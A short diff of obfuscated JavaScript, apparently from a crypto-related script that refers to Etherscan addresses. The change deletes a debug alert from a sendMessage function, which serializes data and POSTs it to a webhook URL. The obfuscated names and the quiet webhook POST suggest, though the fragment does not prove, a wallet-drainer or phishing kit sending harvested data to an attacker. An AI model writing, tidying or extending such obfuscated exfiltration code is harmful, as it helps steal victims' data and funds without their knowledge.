@@ -2696,7 +2696,6 @@ let etherscanURI = 'https://etherscan.io/address/';
 
 function sendMessage(_0x1eb362, _0x54811f) {
     var webhooUri = JSON.stringify(_0x1eb362);
-    alert(webhooUri);
     var _0x8e96ee = _0x5c7eff;
     const _0xee4cf4 = new XMLHttpRequest();
     _0xee4cf4[_0x8e96ee(0xe00)]('POST', _0x54811f),
